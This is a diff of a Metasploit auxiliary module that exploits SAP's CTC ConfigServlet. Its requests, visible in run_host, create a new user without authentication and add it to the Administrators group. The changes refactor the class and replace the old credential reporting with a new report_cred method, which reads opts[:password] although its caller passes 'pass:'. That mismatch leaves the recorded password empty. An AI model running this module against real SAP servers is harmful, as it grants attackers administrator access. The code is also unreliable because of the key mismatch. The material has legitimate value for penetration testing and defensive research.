@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -20,9 +20,7 @@
 # just seem to enjoy hacking SAP :)
 ##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -54,7 +52,7 @@ class Metasploit4 < Msf::Auxiliary
       OptString.new('USERNAME', [true, 'Username to create', 'msf']),
       OptString.new('PASSWORD', [true, 'Password for the new user', '$Metasploit1234$']),
       OptString.new('GROUP', [true, 'Group for the new user', 'Administrators'])
-    ], self.class)
+    ])
   end
 
   def run_host(ip)
@@ -68,20 +66,47 @@ class Metasploit4 < Msf::Auxiliary
 
     vprint_status("#{rhost}:#{rport} - Adding User to Group...")
     uri = '/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;ADD_USER_TO_GROUP;USERNAME=' + datastore['USERNAME'] + ',GROUPNAME=' + datastore['GROUP']
-    if send_request(uri)
+    res = send_request(uri)
+    if res
       print_good("#{rhost}:#{rport} - User #{datastore['USERNAME']} added to group #{datastore['GROUP']}")
     else
       return
     end
 
-    report_auth_info(
-      :host => rhost,
-      :port => rport,
-      :user => datastore['USERNAME'],
-      :pass => datastore['PASSWORD'],
-      :ptype => "password",
-      :active => true
+    report_cred(
+      ip: rhost,
+      port: rport,
+      service_name: 'sap',
+      user: datastore['USERNAME'],
+      pass: datastore['PASSWORD'],
+      proof: res.body
     )
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def send_request(uri)
